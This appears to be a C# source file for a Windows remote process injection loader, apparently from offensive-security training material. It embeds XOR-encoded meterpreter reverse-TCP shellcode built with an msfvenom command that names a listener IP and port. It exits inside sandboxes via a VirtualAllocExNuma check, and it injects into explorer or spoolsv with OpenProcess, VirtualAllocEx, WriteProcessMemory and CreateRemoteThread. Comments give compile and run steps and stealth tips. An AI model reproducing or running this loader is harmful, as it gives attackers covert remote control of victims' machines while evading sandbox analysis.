// ============================================================
// Remote Process Injection (XOR Encoded)
// ============================================================
// WHAT THIS DOES:
//   Injects shellcode into an already-running process (e.g., explorer.exe).
//   The shellcode runs in the context of that process, not our process.
//   This means:
//     - If our process dies, the meterpreter session survives
//     - The meterpreter appears to be explorer.exe (or whichever process)
//     - Forensically harder to attribute to our loader
//
// THE INJECTION PROCESS (classic remote thread injection):
//   1. OpenProcess → get a handle on the target process
//   2. VirtualAllocEx → allocate memory IN the remote process
//   3. WriteProcessMemory → copy shellcode to the remote process
//   4. CreateRemoteThread → create a thread in the remote process at shellcode
//
// WHEN TO USE:
//   - You want to blend into an existing process
//   - You want your session to survive even if your loader dies
//   - Elevation: if admin, inject into spoolsv (more privileged)
//                if user,  inject into explorer (always running)
//   - Or pass process name as argument
//
// SANDBOX EVASION:
//   VirtualAllocExNuma check: This NT function is only available on NUMA
//   systems (real hardware). Many sandbox VMs don't support it and return
//   NULL — we detect this and exit.
//
// HOW TO CUSTOMIZE:
//   1. Generate XOR-encoded shellcode (key 0xfa) for your IP/port
//   2. Replace buf[] below
//   3. Compile: csc.exe /unsafe /platform:x64 /out:injector.exe basic-injection.cs
//   4. Run: .\injector.exe [optional: process_name]
// ============================================================

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace RemoteShinject
{
    public class Program
    {
        // -------------------------------------------------------
        // Enums for process access rights
        // -------------------------------------------------------

        // PROCESS_ALL_ACCESS: Requests all possible access rights to the process.
        // We need: OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread
        // For production use, request only what's needed (less suspicious).
        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF  // PROCESS_ALL_ACCESS
        }

        // MEM_COMMIT | MEM_RESERVE: allocate and commit memory pages
        [Flags]
        public enum AllocationType
        {
            Commit  = 0x1000,  // MEM_COMMIT: Commits physical storage
            Reserve = 0x2000   // MEM_RESERVE: Reserves virtual address space
        }

        // PAGE_EXECUTE_READWRITE: Memory can be read, written, and executed
        [Flags]
        public enum MemoryProtection
        {
            ExecuteReadWrite = 0x40
        }

        // -------------------------------------------------------
        // Win32 API imports
        // -------------------------------------------------------

        // OpenProcess: Get a handle to a running process.
        // We need this handle for all subsequent operations on the target process.
        // processAccess = PROCESS_ALL_ACCESS (0x1F0FFF)
        // bInheritHandle = false (no handle inheritance)
        // processId = PID of target
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);

        // VirtualAllocEx: Allocate memory in a REMOTE process.
        // Like VirtualAlloc but operates on another process.
        // hProcess = handle to remote process
        // lpAddress = NULL (let OS choose address in remote process)
        // dwSize = size of shellcode
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        // WriteProcessMemory: Write bytes into another process's memory.
        // hProcess = handle to target process
        // lpBaseAddress = where to write (the address we got from VirtualAllocEx)
        // lpBuffer = our shellcode bytes
        // nSize = number of bytes to write
        // lpNumberOfBytesWritten = receives actual bytes written (for verification)
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        // CreateRemoteThread: Create a thread in another process.
        // The new thread starts executing at lpStartAddress (our shellcode) in the remote process.
        // hProcess = target process handle
        // lpStartAddress = address of shellcode IN THE REMOTE PROCESS
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        // VirtualAllocExNuma: Allocates memory with NUMA node affinity.
        // Used for SANDBOX EVASION — this function is unavailable in many sandbox VMs.
        // nndPreferred=0 means no NUMA preference, but the call itself checks hardware support.
        [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        // GetCurrentProcess: Returns a pseudo-handle to the current process.
        // Used with VirtualAllocExNuma for the sandbox check.
        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        // -------------------------------------------------------
        // Helper: Detect if running as Administrator
        // -------------------------------------------------------
        static bool IsElevated
        {
            get
            {
                // Check if the current user's SID is the well-known Administrator SID
                // IsWellKnown(BuiltinAdministratorsSid) = true if running as admin
                return WindowsIdentity.GetCurrent().Owner.IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid);
            }
        }

        public static void Main(string[] args)
        {
            // -------------------------------------------------------
            // SANDBOX EVASION: VirtualAllocExNuma check
            // -------------------------------------------------------
            // VirtualAllocExNuma allocates memory with NUMA node awareness.
            // Many sandbox environments (Cuckoo, JoeSandbox, etc.) are VMs that
            // don't implement NUMA support, so this function returns NULL.
            //
            // We allocate 0x1000 bytes (4KB) with:
            //   0x3000 = MEM_COMMIT | MEM_RESERVE
            //   0x4    = PAGE_READWRITE
            //   0      = preferred NUMA node (any)
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                // If NUMA alloc fails, we're likely in a sandbox — exit silently
                return;
            }

            // -------------------------------------------------------
            // SHELLCODE (XOR encoded, key = 0xfa)
            // -------------------------------------------------------
            // REPLACE with your encoded payload for your actual IP/port.
            // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.232.133 LPORT=443 EXITFUNC=thread -f csharp
            // Then XOR each byte with 0xfa
            byte[] buf = new byte[511] {
            0x06, 0xb2, 0x79, 0x1e, 0x0a, 0x12, 0x36, 0xfa, 0xfa, 0xfa, 0xbb, 0xab, 0xbb, 0xaa, 0xa8,
            0xab, 0xac, 0xb2, 0xcb, 0x28, 0x9f, 0xb2, 0x71, 0xa8, 0x9a, 0xb2, 0x71, 0xa8, 0xe2, 0xb2,
            0x71, 0xa8, 0xda, 0xb7, 0xcb, 0x33, 0xb2, 0x71, 0x88, 0xaa, 0xb2, 0xf5, 0x4d, 0xb0, 0xb0,
            0xb2, 0xcb, 0x3a, 0x56, 0xc6, 0x9b, 0x86, 0xf8, 0xd6, 0xda, 0xbb, 0x3b, 0x33, 0xf7, 0xbb,
            0xfb, 0x3b, 0x18, 0x17, 0xa8, 0xbb, 0xab, 0xb2, 0x71, 0xa8, 0xda, 0x71, 0xb8, 0xc6, 0xb2,
            0xfb, 0x2a, 0x9c, 0x7b, 0x82, 0xe2, 0xf1, 0xf8, 0xf5, 0x7f, 0x88, 0xfa, 0xfa, 0xfa, 0x71,
            0x7a, 0x72, 0xfa, 0xfa, 0xfa, 0xb2, 0x7f, 0x3a, 0x8e, 0x9d, 0xb2, 0xfb, 0x2a, 0x71, 0xb2,
            0xe2, 0xaa, 0xbe, 0x71, 0xba, 0xda, 0xb3, 0xfb, 0x2a, 0x19, 0xac, 0xb7, 0xcb, 0x33, 0xb2,
            0x05, 0x33, 0xbb, 0x71, 0xce, 0x72, 0xb2, 0xfb, 0x2c, 0xb2, 0xcb, 0x3a, 0xbb, 0x3b, 0x33,
            0xf7, 0x56, 0xbb, 0xfb, 0x3b, 0xc2, 0x1a, 0x8f, 0x0b, 0xb6, 0xf9, 0xb6, 0xde, 0xf2, 0xbf,
            0xc3, 0x2b, 0x8f, 0x22, 0xa2, 0xbe, 0x71, 0xba, 0xde, 0xb3, 0xfb, 0x2a, 0x9c, 0xbb, 0x71,
            0xf6, 0xb2, 0xbe, 0x71, 0xba, 0xe6, 0xb3, 0xfb, 0x2a, 0xbb, 0x71, 0xfe, 0x72, 0xbb, 0xa2,
            0xbb, 0xa2, 0xa4, 0xa3, 0xb2, 0xfb, 0x2a, 0xa0, 0xbb, 0xa2, 0xbb, 0xa3, 0xbb, 0xa0, 0xb2,
            0x79, 0x16, 0xda, 0xbb, 0xa8, 0x05, 0x1a, 0xa2, 0xbb, 0xa3, 0xa0, 0xb2, 0x71, 0xe8, 0x13,
            0xb1, 0x05, 0x05, 0x05, 0xa7, 0xb3, 0x44, 0x8d, 0x89, 0xc8, 0xa5, 0xc9, 0xc8, 0xfa, 0xfa,
            0xbb, 0xac, 0xb3, 0x73, 0x1c, 0xb2, 0x7b, 0x16, 0x5a, 0xfb, 0xfa, 0xfa, 0xb3, 0x73, 0x1f,
            0xb3, 0x46, 0xf8, 0xfa, 0xfb, 0x41, 0x3a, 0x52, 0x12, 0x7f, 0xbb, 0xae, 0xb3, 0x73, 0x1e,
            0xb6, 0x73, 0x0b, 0xbb, 0x40, 0xb6, 0x8d, 0xdc, 0xfd, 0x05, 0x2f, 0xb6, 0x73, 0x10, 0x92,
            0xfb, 0xfb, 0xfa, 0xfa, 0xa3, 0xbb, 0x40, 0xd3, 0x7a, 0x91, 0xfa, 0x05, 0x2f, 0x90, 0xf0,
            0xbb, 0xa4, 0xaa, 0xaa, 0xb7, 0xcb, 0x33, 0xb7, 0xcb, 0x3a, 0xb2, 0x05, 0x3a, 0xb2, 0x73,
            0x38, 0xb2, 0x05, 0x3a, 0xb2, 0x73, 0x3b, 0xbb, 0x40, 0x10, 0xf5, 0x25, 0x1a, 0x05, 0x2f,
            0xb2, 0x73, 0x3d, 0x90, 0xea, 0xbb, 0xa2, 0xb6, 0x73, 0x18, 0xb2, 0x73, 0x03, 0xbb, 0x40,
            0x63, 0x5f, 0x8e, 0x9b, 0x05, 0x2f, 0x7f, 0x3a, 0x8e, 0xf0, 0xb3, 0x05, 0x34, 0x8f, 0x1f,
            0x12, 0x69, 0xfa, 0xfa, 0xfa, 0xb2, 0x79, 0x16, 0xea, 0xb2, 0x73, 0x18, 0xb7, 0xcb, 0x33,
            0x90, 0xfe, 0xbb, 0xa2, 0xb2, 0x73, 0x03, 0xbb, 0x40, 0xf8, 0x23, 0x32, 0xa5, 0x05, 0x2f,
            0x79, 0x02, 0xfa, 0x84, 0xaf, 0xb2, 0x79, 0x3e, 0xda, 0xa4, 0x73, 0x0c, 0x90, 0xba, 0xbb,
            0xa3, 0x92, 0xfa, 0xea, 0xfa, 0xfa, 0xbb, 0xa2, 0xb2, 0x73, 0x08, 0xb2, 0xcb, 0x33, 0xbb,
            0x40, 0xa2, 0x5e, 0xa9, 0x1f, 0x05, 0x2f, 0xb2, 0x73, 0x39, 0xb3, 0x73, 0x3d, 0xb7, 0xcb,
            0x33, 0xb3, 0x73, 0x0a, 0xb2, 0x73, 0x20, 0xb2, 0x73, 0x03, 0xbb, 0x40, 0xf8, 0x23, 0x32,
            0xa5, 0x05, 0x2f, 0x79, 0x02, 0xfa, 0x87, 0xd2, 0xa2, 0xbb, 0xad, 0xa3, 0x92, 0xfa, 0xba,
            0xfa, 0xfa, 0xbb, 0xa2, 0x90, 0xfa, 0xa0, 0xbb, 0x40, 0xf1, 0xd5, 0xf5, 0xca, 0x05, 0x2f,
            0xad, 0xa3, 0xbb, 0x40, 0x8f, 0x94, 0xb7, 0x9b, 0x05, 0x2f, 0xb3, 0x05, 0x34, 0x13, 0xc6,
            0x05, 0x05, 0x05, 0xb2, 0xfb, 0x39, 0xb2, 0xd3, 0x3c, 0xb2, 0x7f, 0x0c, 0x8f, 0x4e, 0xbb,
            0x05, 0x1d, 0xa2, 0x90, 0xfa, 0xa3, 0x41, 0x1a, 0xe7, 0xd0, 0xf0, 0xbb, 0x73, 0x20, 0x05,
            0x2f
            };

            int len = buf.Length;

            // -------------------------------------------------------
            // DETERMINE TARGET PROCESS
            // -------------------------------------------------------
            String procName = "";

            if (args.Length == 1)
            {
                // If a process name was provided as argument, use it
                procName = args[0];
            }
            else if (args.Length == 0)
            {
                // Auto-select based on privilege level:
                //   Admin: spoolsv (Print Spooler) — runs as SYSTEM, always present
                //   User:  explorer — always running as the logged-in user
                if (IsElevated)
                {
                    Console.WriteLine("Process is elevated.");
                    procName = "spoolsv";
                }
                else
                {
                    Console.WriteLine("Process is not elevated.");
                    procName = "explorer";
                }
            }
            else
            {
                Console.WriteLine("Usage: injector.exe [process_name]");
                return;
            }

            Console.WriteLine($"Attempting to inject into {procName} process...");

            // -------------------------------------------------------
            // GET TARGET PROCESS(ES)
            // -------------------------------------------------------
            // GetProcessesByName returns all running processes with that name.
            // There may be multiple instances (e.g., multiple explorer.exe sessions).
            Process[] expProc = Process.GetProcessesByName(procName);

            // Try each instance until one succeeds
            for (int i = 0; i < expProc.Length; i++)
            {
                int pid = expProc[i].Id;

                // -------------------------------------------------------
                // STEP 1: Get a handle on the target process
                // -------------------------------------------------------
                // OpenProcess with PROCESS_ALL_ACCESS gives us all privileges on the process.
                // For stealth, only request: PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD
                IntPtr hProcess = OpenProcess(ProcessAccessFlags.All, false, pid);
                if ((int)hProcess == 0)
                {
                    Console.WriteLine($"Failed to get handle on PID {pid}.");
                    continue;  // try next process instance
                }
                Console.WriteLine($"Got handle {hProcess} on PID {pid}.");

                // -------------------------------------------------------
                // STEP 2: Allocate RWX memory IN the remote process
                // -------------------------------------------------------
                // VirtualAllocEx allocates memory in the ADDRESS SPACE of another process.
                // We allocate enough for our shellcode with RWX permissions.
                IntPtr expAddr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)len,
                    AllocationType.Commit | AllocationType.Reserve,
                    MemoryProtection.ExecuteReadWrite);
                Console.WriteLine($"Allocated {len} bytes at address {expAddr} in remote process.");

                // -------------------------------------------------------
                // STEP 3: XOR decode our shellcode
                // -------------------------------------------------------
                // Decode the XOR-encoded payload before writing it to the remote process
                for (int j = 0; j < buf.Length; j++)
                {
                    buf[j] = (byte)((uint)buf[j] ^ 0xfa);
                }

                // -------------------------------------------------------
                // STEP 4: Write decoded shellcode to remote process memory
                // -------------------------------------------------------
                // WriteProcessMemory copies bytes from our process to the remote process.
                IntPtr bytesWritten;
                bool procMemResult = WriteProcessMemory(hProcess, expAddr, buf, len, out bytesWritten);
                Console.WriteLine($"Wrote {bytesWritten} payload bytes (result: {procMemResult}).");

                // -------------------------------------------------------
                // STEP 5: Create a thread in the remote process to execute shellcode
                // -------------------------------------------------------
                // CreateRemoteThread creates a thread in 'hProcess' that starts at 'expAddr'.
                // The shellcode is now running inside explorer.exe (or spoolsv.exe).
                IntPtr threadAddr = CreateRemoteThread(hProcess, IntPtr.Zero, 0, expAddr, IntPtr.Zero, 0, IntPtr.Zero);
                Console.WriteLine($"Created remote thread at {threadAddr}. Check your listener!");

                // Injected into first successful target — stop trying others
                break;
            }
        }
    }
}
